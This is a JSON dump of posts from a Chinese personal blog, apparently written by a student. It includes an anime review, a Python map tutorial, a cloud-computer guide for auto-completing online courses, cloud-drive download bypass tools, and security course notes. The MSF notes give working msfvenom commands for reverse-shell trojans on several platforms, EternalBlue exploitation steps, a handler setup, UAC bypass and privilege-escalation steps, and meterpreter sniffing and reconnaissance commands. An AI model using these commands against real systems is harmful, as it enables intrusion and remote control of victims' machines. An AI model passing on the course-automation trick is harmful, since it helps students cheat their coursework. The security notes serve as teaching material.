[{"content":"就在这几天，也就是大一的第二个月，笔者补完了这部旷世神作（包括1、2、剧场版及所有番外篇），下面我说说自己的感受。\n轻音是什么意思？ ​\t从名字看，\u0026ldquo;轻音\u0026rdquo;🤔，是舒缓的轻音乐吗？不是，轻音其实是摇滚。到这里你肯定想到：这不就是这几年非常多的少女乐队作品吗？没错，但是请注意它于2009年4月开播，因此可以说它是定义了整个少女乐队番的开山之作（确实是当之无愧的老资历）。\n轻音主要讲了什么 ​\t无论怎么说，轻音也是废萌番的开创者（也就是无目的的卖萌，且全片大部分时间都在卖萌） 表面上《轻音少女》讲述的是五个少女在高中时期组建轻音部、练习乐器、举办演出的故事。剧情朴实，甚至平淡，没有跌宕起伏的冲突，也没有刻意煽情的桥段。但正因为如此，它显得格外真诚。在那间小小的社团活动室里，少女们泡着茶、吃着点心、聊着天、偶尔练练琴——这就是她们的日常。可正是这些“无所事事”的日常，构成了她们青春最闪耀的部分。\n萌萌的平泽唯（也被称为呆唯） ​\t《轻音少女》的魅力在于它以极其细腻的笔触，捕捉了青春中那些不经意的温柔瞬间：迟到时的慌乱、合奏时的默契、毕业典礼上的拥抱与泪水……所有这些都被京阿尼用几乎完美的演出方式记录下来，让人仿佛也在那个阳光洒满木地板的活动室里，一起听着放学后的风声。\n轻音的内核是什么？ ​\t很多人说，《轻音少女》的核心是“乐队与友情”，但我更愿意称它为一部关于时间与成长的作品。轻音并没有讲述她们多么努力地追梦、如何登上大舞台，而是告诉我们：\n“青春的意义，不一定是要奔向远方，而是和喜欢的人一起度过当下。”\n​\t这是一个在“未来焦虑”中成长的世代所难以理解、却最需要的温柔。 ​\t当我在大一的第二个月看完《轻音》，正是我人生从“被安排好的阶段”走向“自由但未知的阶段”的时候。现在每天都有新的课程、新的朋友、新的困惑。那种不确定感，正是唯、澪、律、紬、梓喵在在结尾即将迎来的生活。她们也曾迷茫过、害怕分别过，但依然在笑着说：“来喝茶吧。” ​\t这种从容、纯粹的生活态度，是我在成年边缘最渴望抓住的东西。轻音告诉我：成长不一定要轰轰烈烈，有时候，慢下来、珍惜身边的人，就是一种了不起的勇气。\n为什么在这个时间点看《轻音》更打动我 ​\t如果说十几年前的观众在看《轻音》时感受到的是可爱与治愈，那么在今天、在我这个年纪再看，它更像一面时间的镜子。 ​\t当我坐在寝室的床边，回望刚结束不久的高中生活——那段总觉得漫长却又转瞬即逝的三年——我突然发现，原来我也曾有过那样的“轻音时光”。 ​\t只是那时的我被模拟考、升学和倒计时淹没，很少有机会停下来认真体会：和朋友汗洒绿茵场的畅快、课间一起吃零食的笑声、临近毕业时郁闷不已又假装镇定的自己。\n备考中的呆唯（真的在学习吗？） ​\t现在看《轻音》，我仿佛重新看见了那些被时间模糊掉的小瞬间。 ​\t唯她们喝茶聊天的悠闲、律的无厘头、澪的害羞、梓喵初入社团时的认真——都像是在提醒我，那些不起眼的日子其实也在闪闪发光。 ​\t而我当时或许没能察觉，只顾着向前走，直到现在才懂，那些看似平凡的时光，才是青春最难得的部分。\n​\t我们这一代人生活在高速运转的社会——信息爆炸、AI崛起、焦虑无处不在。我们被催促着“提升效率”“走在前面”，但《轻音》提醒我，人生不只是向前奔跑，还有停下来听听吉他的余音、和朋友一起笑着浪费的午后。\n​\t那种“慢”的力量，是轻音留给我们的礼物。 ​\t它不是反现代的，而是一种温柔的反思：\n我们在追逐未来的同时，是否还记得此刻的风有多温暖？\n结语 ​\t当五位少女在毕业演出上弹起最后一首歌、灯光洒下、观众欢呼的那一刻，我突然明白，《轻音少女》并不是在讲她们的青春结束了，而是告诉观众：你的青春正在开始。\n​\t而现在，我坐在宿舍的书桌前，窗外夜色温柔，校园的风吹动窗帘。也许若干年后，我也会像她们一样，在某个分别的瞬间，对朋友说一句——“谢谢你，一直以来。”\n​\t愿我们都能在自己的日常里，找到那份轻音的旋律。\nMusic Time! 结尾带来一首剧中几人告别时演奏的一首《相遇天使》，欢迎欣赏（当然您在剧中按照剧情顺其自然的收听更好）\n最后一次在学园祭上演出完的众人 ","date":"2025-11-01T09:58:38+08:00","image":"https://www.retr0.xyz/post/%E5%BD%B1%E8%A7%86/qy3.png","permalink":"https://www.retr0.xyz/p/%E6%81%B0%E5%88%B0%E5%A5%BD%E5%A4%84%E7%9A%84%E8%A1%A5%E5%AE%8C%E8%BD%BB%E9%9F%B3%E5%B0%91%E5%A5%B3%E8%A7%82%E5%90%8E%E6%84%9F/","title":"恰到好处的补完—《轻音少女》观后感"},{"content":"云服务器/云电脑的获取 方案一：阿里云（免费） 云电脑的购买（领取） 1.访问学生用券中心-阿里云云工开物，登录账号后点击领取 学生300元优惠券\n这期间可能会要求进行实名认证和学生认证，如实填写就好\n这个按钮原本是领取，领完之后就会变成“立即使用”\n2.现在我们往下翻看到下面有无影云电脑这一栏，点击它\n下面有这样几个产品：\n3.我们这里选择第四个：“个人版云电脑核时包：8000核时”，点击立即购买\n等待右面弹窗价格计算完毕为￥0.00元后点击立即购买（如下图）\n云电脑的启用 现在我们已经成功购买了8000核时的时长，但是注意，有时长并不代表我们有云电脑，因为阿里云的云电脑分为两个部分： 设备（有不同配置和有效期）+时长， 不过没关系，针对无影云电脑的新客户，阿里云会赠送有效期一个月的免费体验普通配置设备，但这对于我们仅需要挂机刷课的需求肯定是够的。\n1.接下来我们下载并安装无影云电脑客户端，网站无影客户端下载_无影云电脑_客户端下载_无影-阿里云\n下载Windows版本（如图）\n2.打开“无影云电脑”并登录你的阿里云账号后可以看到软件上方已经显示核时算力8000.0，同时下面有个免费试用的按钮，点击它\n3.在弹出的界面可以看到右下角的“本次应付 ￥0.00”，点击立即下单\n随后的云电脑名称随便填写，常用地就填你所在的地区，这样可以为你分配你附近的服务器，从而大大降低延迟\n用支付宝扫码开通免密支付（不会扣款）\n你肯定已经猜到了，这其实就是常见的首月免费试用，接下来开始扣款的常见方案，所以我们要取消连续订阅。\n4.点击左下角用户里的订单管理\n点击右面的订阅管理\n在弹出的窗口中点击取消连续订阅即可\n如果还是不放心的话可以去支付宝的 **设置-支付设置-自动续费/免密支付-免密支付-阿里云免密支付-关闭服务 **中彻底关闭。\n补充：到期了怎么办？ 别急,请注意我们之前领的是300元的优惠券,但是购买\u0026quot;个人版云电脑核时包：8000核时\u0026ldquo;只花了247.40元,因此我们还剩下52.6元的优惠券没用,好!所以我们现在购买这个产品:\n计算价格后仍为0.00元,这波羊毛是不是薅爽了\n接下来的配置就和上面一样了,不再过多叙述\n方案二:京东云(进阶：一年￥38) 我们访问双11大促-京东云\n这有个38一年的云主机，但是蹲点抢购，看你个人想法吧，实测不是特别难抢\n然后如果抢到了记得配置的时候系统选 Windows Server 2022 数据中心版 即可\n远程连接上跟普通电脑没啥区别\n云电脑的启动与配置 由于我们的需求是挂机刷课，因此要把断连自动关机的功能关闭，因此，我们点击云电脑列表里你刚才购买的云电脑的 管理-策略-断连定时关机/休眠 ，关闭这个开关即可 接下来我们启动云电脑，点击你的云电脑右下角的蓝色圆形按钮远程连接云电脑 进入云电脑桌面后打开Microsoft Edge浏览器，搜索“大学搜题酱插件”，点击如图所示的搜索结果\n在如下图的网页中点击“获取”，然后在上方的小弹窗中点击“添加扩展”\n安装完成后会弹窗让你用“大学搜题酱app”扫码登录\n接下来进入你的学习通后台开启一门（不要同时刷多门）课程即可\n‼️‼️‼️ 注意：云电脑端在刷课时手机端不要进入课程看视频或做题，否则会把云电脑上的账号顶掉,此外,强烈建议每天进入云电脑2-3次检查刷课是否正常,因为长时间刷课可能因为种种原因(如内存溢出,登录失效等)需要重新登录,你只要刷新一下网页重新登录即可.\n","date":"2025-11-18T11:24:14+08:00","image":"https://img1.dancihu.com/2023-10-31/a116a2e0-4624-8c67-900f-7e6165b9012f.jpg","permalink":"https://www.retr0.xyz/p/%E5%85%8D%E8%B4%B9%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E5%9F%BA%E4%BA%8E%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/%E4%BA%91%E7%94%B5%E8%84%91%E7%9A%84%E5%85%A8%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE%E5%B9%B3%E5%8F%B0/","title":"[免费]保姆级教程：基于云服务器/云电脑的全自动刷课平台"},{"content":" 网盘 地址 使用说明 百度 Vite App 无使用条件,解析50个文件,大小限制 10TB 内(每日刷新) 百度 百度网盘资源搜索 因成本问题,该站点已经停止运行 百度 百度网盘资源搜索 需要获取解析密码,解析20个文件,大小限制 30GB 内(每日刷新) 夸克 Kdown - 夸克网盘解析 Free版本 需要获取解析密码,无数量限制,无大小限制 阿里 https://bw.01233.xyz/alipan 寄了 百度 KDown-Free - 百度网盘解析工具 需要获取解析密码,无数量限制,无大小限制 迅雷 客户端破解 因被投诉,已删除下架 安卓端下载器:AriaNgGUI\nPC端下载器:Motrix\n","date":"2025-11-08T20:57:28+08:00","permalink":"https://www.retr0.xyz/p/%E4%B8%BB%E6%B5%81%E7%BD%91%E7%9B%98%E8%A7%A3%E6%9E%90%E6%BB%A1%E9%80%9F%E4%B8%8B%E8%BD%BD-%E7%99%BE%E5%BA%A6%E5%A4%B8%E5%85%8B%E8%BF%85%E9%9B%B7%E9%98%BF%E9%87%8C/","title":"主流网盘解析,满速下载 ,(百度,夸克,迅雷,阿里)"},{"content":"系统权限 Windows 最高：SYSTEM\n用户最高:Administrator\nothers\nLinux 最高：root\n其他都是普通\nCPU权限 OS（操作系统）\nring0（驱动程序）\nring3（大多数其他软件）\n目标信息搜集 以下命令均在meterpreter \u0026gt;上执行\n系统信息 run post/windows/gather/checkvm\n检查目标是否是虚拟机\nrun post/windows/gather/enum_services\n查看目标系统上运行的服务（例如有VM tools必为虚拟机）\nrun post/windows/gather/enum_applications\n查看目标系统上安装的软件\nrun post/windows/gather/dumplinks\n查看目标系统上最近的操作\nrun post/windows/gather/enum_shares\n查看是否开启了共享\nrun post/windows/gather/enum_patches\n查看目标安装了那些补丁\nrun winenum\n查看环境变量\n数据嗅探和wireshark的使用 注意： 首先执行load sniffer加载sniffer模块\nsniffer_interfaces\t查看对方网卡（判断是否启用dhcp:true大概率启用）\nsniffer_start [网卡编号]\t开始嗅探指定网卡\nsniffer_start [网卡编号]\t停止嗅探指定网卡\nsniffer_dump [网卡编号] [路径及文件名]\t将嗅探到的数据保存到指定文件中\n例如：sniffer_dump 2 /home/kali/Desktop/123.cap\n过滤器的使用 点击打开保存的文件，可以在过滤器中输入ip.src_host==[ip地址]来过滤目标发出的数据包\n在过滤器中输入ip.dst_host==[ip地址]来过滤返回的数据包\n!(ip.src_host==[ip地址])\t过滤除了某个ip以外的所有数据包\ntcp 或udp等\t只查看某种协议的数据包\n组合使用： ip.src_host==[ip地址] \u0026amp;\u0026amp; tcp\n其余自行摸索\n常见网络协议 以下是网络通信中最常见的协议分类整理，包含 协议名称、中文名、核心作用 及关键补充说明，按功能场景分组便于理解：\n核心传输层协议（负责端到端数据传输） 协议名称 中文名 核心作用 关键特点 TCP 传输控制协议 提供可靠、面向连接的字节流传输 三次握手建立连接、四次挥手断开、重传机制（保证数据不丢失/不重复），适用于文件传输、网页加载等场景 UDP 用户数据报协议 提供无连接、不可靠的数据包传输 无握手过程、低延迟，适用于视频通话、游戏、直播等对实时性要求高于可靠性的场景 网络层协议（负责路由与寻址） 协议名称 中文名 核心作用 关键特点 IP 网际协议 定义数据包格式，实现跨网络设备的寻址与转发 TCP/UDP 的底层支撑，仅负责“送达”，不保证可靠性（IPv4 是目前主流，IPv6 逐步普及） ICMP 互联网控制消息协议 用于网络设备间的差错报告与状态查询 常见场景：ping 命令（检测主机可达性）、 traceroute（追踪路由路径） ARP 地址解析协议 将 IP 地址转换为物理地址（MAC 地址） 局域网内通信必需，解决“知道对方 IP 但不知道硬件地址”的问题 RARP 反向地址解析协议 将 MAC 地址转换为 IP 地址 适用于无 DHCP 服务器的场景（如早期无盘工作站） IGMP 互联网组管理协议 用于主机加入/退出多播组 支持视频会议、组播直播等“一对多”通信场景 应用层协议（直接面向用户业务） 协议名称 中文名 核心作用 关键特点 DNS 域名系统协议 将域名（如 www.baidu.com）解析为 IP 地址 解决“记 IP 难”的问题，是互联网访问的“地址簿” HTTP 超文本传输协议 用于 Web 浏览器与服务器之间的网页传输 明文传输（不安全），默认端口 80，支撑普通网页访问 HTTPS 安全超文本传输协议 HTTP + TLS/SSL 加密，实现安全的网页传输 加密数据（防窃听/篡改），默认端口 443，用于支付、登录等敏感场景 FTP 文件传输协议 用于客户端与服务器之间的文件上传/下载 明文传输，默认端口 21（控制）+ 20（数据），适用于非敏感文件传输 SFTP SSH 文件传输协议 基于 SSH 加密的文件传输协议 加密传输（替代 FTP），默认端口 22，安全性更高 SSH 安全外壳协议 远程登录服务器并执行命令 加密传输（替代 Telnet），默认端口 22，是服务器管理的核心协议 Telnet 远程终端协议 远程登录服务器（明文传输） 无加密（不安全），默认端口 23，仅用于测试或非敏感环境 SMTP 简单邮件传输协议 用于发送电子邮件（服务器到服务器） 默认端口 25（明文）/ 465（SSL 加密），支撑邮件发送功能 POP3 邮局协议版本 3 用于接收电子邮件（客户端到服务器） 下载邮件到本地，默认端口 110（明文）/ 995（SSL 加密） IMAP4 互联网邮件访问协议版本 4 接收电子邮件（支持邮件同步） 可在多设备同步邮件状态（已读/未读），默认端口 143（明文）/ 993（SSL 加密） NTP 网络时间协议 实现网络设备间的时间同步 保证服务器、终端等设备时间一致，默认端口 123（UDP） DHCP 动态主机配置协议 自动为客户端分配 IP 地址、子网掩码等网络参数 无需手动设置 IP，适用于局域网（如家庭、公司网络） SNMP 简单网络管理协议 监控和管理网络设备（路由器、交换机等） 收集设备状态（如流量、负载），默认端口 161（UDP） TFTP 简单文件传输协议 轻量级文件传输（无认证） 仅支持简单上传/下载，无权限验证，默认端口 69（UDP），适用于设备固件升级 其他常用协议（特殊功能场景） 协议名称 中文名 核心作用 关键特点 PPPoE 基于以太网的点对点协议 用于宽带拨号上网（如电信、联通家庭宽带） 实现“账号+密码”认证，建立互联网连接 L2TP 第二层隧道协议 与 IPsec 配合实现 VPN 连接 用于远程办公访问公司内网，默认端口 1701 IPSec IP 安全协议 为 IP 数据包提供加密、认证服务 常用于 VPN 加密（如 L2TP/IPSec、IKEv2），保障跨网传输安全 MQTT 消息队列遥测传输协议 轻量级物联网（IoT）设备通信协议 低带宽、低功耗，适用于传感器、智能家居设备的数据传输 ","date":"2025-12-04T22:10:13+08:00","permalink":"https://www.retr0.xyz/p/1.8-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%8F%8A%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/","title":"1.8 操作系统权限及密码破解"},{"content":"前置知识 基础地图演示 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pyecharts.charts import Map from pyecharts.options import VisualMapOpts map = Map() data = [ (\u0026#39;北京市\u0026#39;,99), (\u0026#39;上海市\u0026#39;,199), (\u0026#39;湖南省\u0026#39;,299), (\u0026#39;台湾省\u0026#39;,199), (\u0026#39;安徽省\u0026#39;,299), (\u0026#39;广州省\u0026#39;,399), (\u0026#39;湖北省\u0026#39;,599) ] map.add(\u0026#39;地图\u0026#39;,data,\u0026#39;china\u0026#39;) map.render() 这样只实现了基础的数据导入，看起来地图还不够直观，所以我们使用全局设置\n1 2 3 4 5 6 7 8 9 10 11 12 13 map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) 成果展示：\n实操部分 全国疫情地图 数据准备 之前贴出来的所用数据有问题，这里给出新的：百度网盘 请输入提取码，目测没有不符合json格式的地方\n我们再次使用之前的json视图网站JSON在线视图查看器(Online JSON Viewer)，把json内容粘贴进去可见其结构主要如下面所示：\n制定主要任务列表：\n打开并读取文件 取其中省份及其对应确诊人数 将取出的数据转换为适当的格式 将数据导入到地图中 配置地图全局设置 生成地图 开始（分块讲解） 我们直接开始读取文件\n1 2 3 txt = open(\u0026#34;T:/疫情.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) data = txt.read() txt.close() 现在txt中的内容已经加载到data变量中了，接下来我们取其中数据\n1 2 3 import json dict = json.loads(data) pro_list = dict[\u0026#39;areaTree\u0026#39;][0][\u0026#39;children\u0026#39;] 由之前经验可得，需要将每个省份及其对应确诊人数写成一个元组，再将所有元组封装为一个列表才能导入到pyecharts模块中。\n1 2 3 4 5 data_list=[] for pro_data in pro_list: pro_name = pro_data[\u0026#39;name\u0026#39;] pro_confirm = pro_data[\u0026#39;total\u0026#39;][\u0026#39;confirm\u0026#39;] data_list.append((pro_name,pro_confirm)) 下面是制图部分\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 from pyecharts.charts import Map from pyecharts.options import VisualMapOpts map = Map() map.add(\u0026#39;全国确诊情况\u0026#39;,data_list,\u0026#39;china\u0026#39;) map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) 整合完全版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import json from pyecharts.charts import Map from pyecharts.options import VisualMapOpts txt = open(\u0026#34;T:/疫情.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) data = txt.read() txt.close() dict = json.loads(data) pro_list = dict[\u0026#39;areaTree\u0026#39;][0][\u0026#39;children\u0026#39;] data_list=[] for pro_data in pro_list: pro_name = pro_data[\u0026#39;name\u0026#39;] pro_confirm = pro_data[\u0026#39;total\u0026#39;][\u0026#39;confirm\u0026#39;] data_list.append((pro_name,pro_confirm)) map = Map() map.add(\u0026#39;全国确诊情况\u0026#39;,data_list,\u0026#39;china\u0026#39;) map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) map.render() 结果展示：\n附加小练习：江苏疫情地图 提示： 地图类型从\u0026rsquo;china\u0026rsquo;改为\u0026rsquo;江苏\u0026rsquo;，剩余请自行挑战。\n数据准备 注意：原来的数据在地名上有问题（缺少“省”、“市”后缀），我只补全了省份名称和江苏省各市名称，如有需要请自行补全。\n根据上面得到的数据结构确定如何取出数据\n整合完全版 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import json from pyecharts.charts import Map from pyecharts.options import VisualMapOpts txt = open(\u0026#34;T:/疫情.txt\u0026#34;,\u0026#39;r\u0026#39;,encoding=\u0026#34;UTF-8\u0026#34;) data = txt.read() txt.close() dict = json.loads(data) js_list = dict[\u0026#39;areaTree\u0026#39;][0][\u0026#39;children\u0026#39;][1][\u0026#39;children\u0026#39;] data_list=[] for js_data in js_list: js_name = js_data[\u0026#39;name\u0026#39;] js_confirm = js_data[\u0026#39;total\u0026#39;][\u0026#39;confirm\u0026#39;] data_list.append((js_name,js_confirm)) map = Map() map.add(\u0026#39;江苏确诊情况\u0026#39;,data_list,\u0026#39;江苏\u0026#39;) map.set_global_opts( visualmap_opts=VisualMapOpts( is_show=True, is_piecewise=True, pieces=[ {\u0026#34;min\u0026#34;: 1, \u0026#34;max\u0026#34;: 9, \u0026#34;label\u0026#34;: \u0026#34;1-9人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CCFFFF\u0026#34;}, {\u0026#34;min\u0026#34;: 10, \u0026#34;max\u0026#34;: 99, \u0026#34;label\u0026#34;: \u0026#34;10-99人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FFFF99\u0026#34;}, {\u0026#34;min\u0026#34;: 100, \u0026#34;max\u0026#34;: 499, \u0026#34;label\u0026#34;: \u0026#34;99-499人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF9966\u0026#34;}, {\u0026#34;min\u0026#34;: 500, \u0026#34;max\u0026#34;: 999, \u0026#34;label\u0026#34;: \u0026#34;499-999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#FF6666\u0026#34;}, {\u0026#34;min\u0026#34;: 1000, \u0026#34;max\u0026#34;: 9999, \u0026#34;label\u0026#34;: \u0026#34;1000-9999人\u0026#34;, \u0026#34;color\u0026#34;: \u0026#34;#CC3333\u0026#34;}, {\u0026#34;min\u0026#34;: 10000,\u0026#34;label\u0026#34;:\u0026#34;10000以上\u0026#34;,\u0026#34;color\u0026#34;:\u0026#34;#990033\u0026#34;} ]) ) map.render() 成果展示：\n","date":"2025-12-03T18:25:08+08:00","permalink":"https://www.retr0.xyz/p/10.4-%E7%BB%83%E4%B9%A0%E4%BA%8C%E5%9C%B0%E5%9B%BE/","title":"10.4 练习二：地图"},{"content":" 本篇课程如未特别解释均使用 Kali 虚拟机进行\nMSF的了解 msf（全称 metasploit）是一款功能强大的攻击框架框架\n现在我们打开msf\n启动 Kali，在终端中输入msfconsole打开msf\nmsf中集成了很多工具，例如你可以调用nmapnmap -sV [目标ip]\n实验部分 msf使用漏洞进行攻击 这里以漏洞：永恒之蓝 ms17_010为例\n前置知识： msf如果使用漏洞去攻击对方，需要的条件：\n漏洞 攻击载荷（木马、病毒） STEP1 利用漏洞进入目标计算机 1 2 3 4 use exploit/windows/smb/ms17_010_eternalblue\t选择要使用的漏洞 show options\t查看使用要求 set rhosts [目标ip]\trun或者exploit 返回了以下内容说明漏洞已经利用成功:\tWIN!\nSTEP2 执行命令 这时发现控制台的指令前缀已经从msf \u0026gt;变成了metepreter \u0026gt;我们可以敲一个help看看有什么指令可用\n这边举例几个常用指令：\ngetuid\t查看当前控制的用户账户权限\nshell\t打开目标的终端\n其他命令可以参考这篇文章：Meterpreter 命令手册（中文）\n退出连接输入\texit\n另外如果想要暂时断开（挂起）连接可以使用：background命令\n这时当前连接就会被保存为名称为session 的任务，其中为数字，例如session 1\nsessions\t查看控制了多少人\n过会要重新连接时可以输入sessions -i 1即可\n基于木马程序的msf内网渗透 服务端准备 现在我们要用msf生成 32位 木马程序，执行下面的命令：\n1 2 cd Desktop/\t方便找到exe文件 msfvenom -a x86 -platform windows -p windows/meterpreter/reverse_tcp LHOST=[控制端ip] lport=[端口号] -f exe \u0026gt; 文件名.exe 现在我们生成的是用于服务端的文件，接下来我们开始配置控制端\n补充：生成64位木马命令\n1 msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f exe -o 文件名.exe 控制端准备 msfconsole\t打开msf控制台\n1 2 3 4 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp\tpayload后的内容要与上面-p后面的内容一致 set lhost [控制端ip] run或者Sexploit 现在开始如果有目标打开了木马程序就会自动连接到被控端：\n其他类型木马 生成Mac木马（32位旧版）\n1 msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp lhost=[控制端ip] lport=[端口号] -f macho -p 文件名.macho 生成安卓木马（旧版，需要数字签名）\n1 msfvenom -a x86 --platform Android -p android/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f apk -o 文件名.apk 生成power shell木马（raw表示生成代码，不是程序）\n1 msfvenom -a x86 --platform windows -p windows/powershell_reverse_tcp lhost=[控制端ip] lport=[端口号] -e cmd/powershell_base64 -i 3 -f raw -o msf.ps1 生成Linux木马\n1 msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f elf -o 文件名.elf 生成python木马\n1 msfvenom -p python/meterpreter/reverse_tcp lhost=[控制端ip] lport=[端口号] -f raw -o 文件名.py meterpreter操作补充 提权 方法一：直接提权\ngetsystem\t直接提权（有风险，可能报错）\n方法二：通过ask模块提权\n若当前已经进入meterpreter \u0026gt; 控制台：\n1 2 3 background\t挂起连接 use exploit/windows/local/ask\t加载ask模块 info\t查看信息 查看到需要指定目标的session号码，所以使用sessions查询（以session 1为例）\n1 2 3 set session 1 set filename QQ.exe 此处填伪装的文件名，以qq为例 run 方法三：UAC绕过提权（成功率不高，仅限32位系统）\n1 2 3 4 use exploit/windows/local/bypassuac show options set session [编号] run 之后会反弹一个新的session，进入这个新的session\n","date":"2025-12-02T18:33:10+08:00","permalink":"https://www.retr0.xyz/p/1.7-msf%E6%A1%86%E6%9E%B6%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/","title":"1.7 MSF框架以及使用"},{"content":"核心命令（Core Commands） 命令 描述 ? 帮助菜单 background 将当前会话转入后台 bg background 的别名 bgkill 终止后台运行的 Meterpreter 脚本 bglist 列出所有运行中的后台脚本 bgrun 以后台线程模式执行 Meterpreter 脚本 channel 显示或控制活跃的通道信息 close 关闭通道 detach 分离 Meterpreter 会话（适用于 http/https 传输） disable_unicode_encoding 禁用 Unicode 字符串编码 enable_unicode_encoding 启用 Unicode 字符串编码 exit 终止 Meterpreter 会话 get_timeouts 获取当前会话的超时时间配置 guid 获取会话的 GUID（全局唯一标识符） help 帮助菜单 info 显示 Post 模块的详细信息 irb 在当前会话中打开交互式 Ruby shell load 加载一个或多个 Meterpreter 扩展模块 machine_id 获取会话关联主机的 MSF 标识符 migrate 将 Meterpreter 服务端迁移到其他进程 pivot 管理跳板监听（内网穿透相关） pry 在当前会话中打开 Pry 调试器 quit 终止 Meterpreter 会话（同 exit） read 从通道读取数据 resource 执行文件中存储的命令序列 run 执行 Meterpreter 脚本或 Post 模块 secure （重新）协商会话的 TLV 数据包加密 sessions 快速切换到另一个会话 set_timeouts 设置当前会话的超时时间配置 sleep 强制 Meterpreter 静默，之后重新建立会话 ssl_verify 修改 SSL 证书验证设置 transport 管理会话传输机制（如 http/https/tcp） use \u0026ldquo;load\u0026rdquo; 的废弃别名（不推荐使用） uuid 获取当前会话的 UUID（通用唯一标识符） write 向通道写入数据 脱钩命令（Unhook Commands） 命令 描述 unhook_pe 解除当前进程的钩子（对抗反病毒检测） 权限提升命令（Priv: Elevate Commands） 命令 描述 getsystem 